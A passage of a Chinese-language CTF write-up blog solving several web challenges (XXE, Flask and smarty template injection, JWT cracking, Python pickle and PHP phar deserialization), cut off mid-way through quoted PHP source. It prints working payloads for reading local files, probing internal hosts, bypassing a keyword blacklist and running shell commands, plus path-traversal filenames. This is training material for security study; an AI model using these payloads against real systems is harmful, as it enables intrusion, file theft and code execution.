serialize($b);</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$b</span>));</span><br></pre></td></tr></table></figure><p>最后即可得到flag，算是一道入门的php链题吧</p><blockquote><p>flag{3beb1994-1149-438c-847e-9c5315aba30b}</p></blockquote><h2 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h2><p>这题跟之前的那道XXE题目差不多，但是后面获取flag的姿势换了</p><h3 id="XXE打内网"><a href="#XXE打内网" class="headerlink" title="XXE打内网"></a>XXE打内网</h3><p>先看看/etc/passwd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">hacker</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY a <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;a;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>a<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以进去，去看看/flag能不能拿到东西</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">hacker</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY a <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///flag&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;a;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>a<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p>结果出现报错了，应该是没有flag这个文件</p><p>这里看了看别人的WP，学到了一些新东西，XXE可以直接查看内网</p><p>核心文件是<code>/etc/hosts</code>和<code>/proc/net/arp</code>，用来查看内网存活的主机IP</p><p>只有<code>/proc/net/arp</code>有出现内网IP，直接读取看看</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">hacker</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY a <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://10.0.96.2&quot;</span>&gt;</span> </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;a;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>a<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure><p>没有啥有用的回显，直接爆ip的c段</p><p><img src="https://i.loli.net/2021/04/24/d1XVvrb5qakgt4h.png"></p><h2 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h2><h3 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h3><p>在解密界面输入一些随机字符串，出现了报错回显，显示出了一部分源代码</p><p>发现可以SSTI，而且有个waf过滤了一些东西，直接查看源代码看看waf里有什么</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;app.py&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>拿到waf的源代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params"><span class="built_in">str</span></span>):</span></span><br><span class="line">    black_list = [<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;os&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;import&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;chr&quot;</span>,<span class="string">&quot;request&quot;</span>,</span><br><span class="line">                  <span class="string">&quot;subprocess&quot;</span>,<span class="string">&quot;commands&quot;</span>,<span class="string">&quot;socket&quot;</span>,<span class="string">&quot;hex&quot;</span>,<span class="string">&quot;base64&quot;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;?&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> black_list :</span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">in</span> <span class="built_in">str</span>.lower() :</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><p>虽然过滤了一些东西，但是还是可以用字符串拼接来进行注入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__imp&#x27;</span>+<span class="string">&#x27;ort__&#x27;</span>](<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>).listdir(<span class="string">&#x27;/&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p>拿到目录，看见个<code>this_is_the_flag.txt</code>，但是flag被过滤了</p><p>所以可以这样子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;/this_is_the_fl&#x27;</span>+<span class="string">&#x27;ag.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>拿到flag</p><blockquote><p>flag{2f47beb4-67e1-40f4-b9f3-444d0003f7b7}</p></blockquote><h2 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h2><p>题目提示说要买到lv6，整个脚本跑一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;utl_here/shop?page=&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">2000</span>):</span><br><span class="line">    r = requests.get(url + <span class="built_in">str</span>(i))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;lv6.png&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>结账的时候发现要<code>1145141919.0</code>才能买下，应该是要抓包改一下</p><p><img src="https://i.loli.net/2021/04/20/3UkrX7lyMep8Obz.png"></p><p>改一下折扣，发现需要admin才能进入</p><h3 id="JWT解密"><a href="#JWT解密" class="headerlink" title="JWT解密"></a>JWT解密</h3><p>重新抓包，发现了JWT，进<a href="https://jwt.io/">JWT解密网站</a>解出来</p><p>然后用<a href="https://github.com/brendan-rius/c-jwt-cracker">c-jwt-cracker</a>解出key为<code>1Kun</code>（tips：k要大写</p><p>最后再重新生成一下JWT</p><p><img src="https://i.loli.net/2021/04/21/nimrRTh682gJpaV.png"></p><p>抓包上传一下，成功进入</p><h3 id="python反序列化漏洞"><a href="#python反序列化漏洞" class="headerlink" title="python反序列化漏洞"></a>python反序列化漏洞</h3><p>源代码内发现一个<a href="http://www.zip/">www.zip</a></p><p><img src="https://i.loli.net/2021/04/21/5g1Sa23WAjf8tGR.png"></p><p>下载后进入Admin.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> sshop.base <span class="keyword">import</span> BaseHandler</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminHandler</span>(<span class="params">BaseHandler</span>):</span></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="keyword">if</span> self.current_user == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;no_ass.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @tornado.web.authenticated</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span>(<span class="params">self, *args, **kwargs</span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            become = self.get_argument(<span class="string">&#x27;become&#x27;</span>)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=p, member=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> self.render(<span class="string">&#x27;form.html&#x27;</span>, res=<span class="string">&#x27;This is Black Technology!&#x27;</span>, member=<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>这里可以看出使用了tornado的<code>get_argument</code>进行获取become变量，然后使用<code>pickle</code>进行序列化，这里就是我们可以利用的点</p><p>具体看这里<a href="http://bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/">关于Python sec的一些简单的总结</a>还有这里<a href="https://xz.aliyun.com/t/2289#toc-5">Python反序列化漏洞的花式利用</a></p><p>所以我们就可以写一个脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;open(&#x27;/flag.txt&#x27;, &#x27;r&#x27;).read()&quot;</span>,))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure><p>这样就可以算出来提取flag的become值，然后再提交一次就可以拿到flag了</p><blockquote><p>flag{a18502ab-fc97-410e-8bb7-744f815d7601}</p></blockquote><h2 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h2><h3 id="smarty的SSTI"><a href="#smarty的SSTI" class="headerlink" title="smarty的SSTI"></a>smarty的SSTI</h3><p>看到smarty时想到了SSTI，并且提示注入点在X-Forwarded-For，简单测试一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: &#123;&#123;7 * 7&#125;&#125;</span><br></pre></td></tr></table></figure><p>回显出49，说明存在smartySSTI，查了一下常用的payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="keyword">if</span> phpinfo()&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line">&#123;<span class="keyword">if</span> system(<span class="string">&#x27;ls&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line">&#123; readfile(<span class="string">&#x27;/flag&#x27;</span>) &#125;</span><br><span class="line">&#123;<span class="keyword">if</span> show_source(<span class="string">&#x27;/flag&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line">&#123;<span class="keyword">if</span> system(<span class="string">&#x27;cat ../../../flag&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125; </span><br></pre></td></tr></table></figure><p>成功拿到flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="keyword">if</span> system(<span class="string">&#x27;cat /flag&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br></pre></td></tr></table></figure><h2 id="CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]Dropbox</h2><p>注册登陆后有个上传文件的按钮，本来以为是upload的，但是传了点东西都没啥反应，也不知道上传目录在哪，点下载的时候抓包发现了一个<code>filename</code>，应该可以把需要的文件下下来看源码</p><blockquote><p>../../index.php</p><p>../../download.php</p><p>../../delete.php</p><p>../../class.php (这个是下完index.php后在里面看到include的</p></blockquote><h3 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h3><p><a href="https://xz.aliyun.com/t/2715">这里是原理</a></p><p>看看class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$dbaddr</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="variable">$dbuser</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbpass</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;dropbox&quot;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> mysqli(<span class="variable">$dbaddr</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db = <span class="variable">$db</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user_exist</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;bind_param(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;execute();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;store_result();</span><br><span class="line">        <span class="variable">$count</span> = <span class="variable">$stmt</span>-&gt;num_rows;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$count</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;user_exist(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = sha1(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;bind_param(<span class="string">&quot;ss&quot;</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;execute();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;user_exist(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = sha1(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;bind_param(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;execute();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;bind_result(<span class="variable">$expect</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;fetch();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$expect</span>) &amp;&amp; <span class="variable">$expect</span> === <span class="variable">$password</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$filenames</span> = scandir(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$key</span> = array_search(<span class="string">&quot;.&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line">        <span class="variable">$key</span> = array_search(<span class="string">&quot;..&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$filenames</span> <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="keyword">new</span> File();</span><br><span class="line">            <span class="variable">$file</span>-&gt;open(<span class="variable">$path</span> . <span class="variable">$filename</span>);</span><br><span class="line">            array_push(<span class="keyword">$this</span>-&gt;files, <span class="variable">$file</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;name()] = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        array_push(<span class="keyword">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;name()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$table</span> = <span class="string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;funcs <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . htmlentities(<span class="variable">$func</span>) . <span class="string">&#x27;&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;results <span class="keyword">as</span> <span class="variable">$filename</span> =&gt; <span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$func</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . htmlentities(<span class="variable">$value</span>) . <span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . htmlentities(<span class="variable">$filename</span>) . <span class="string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; 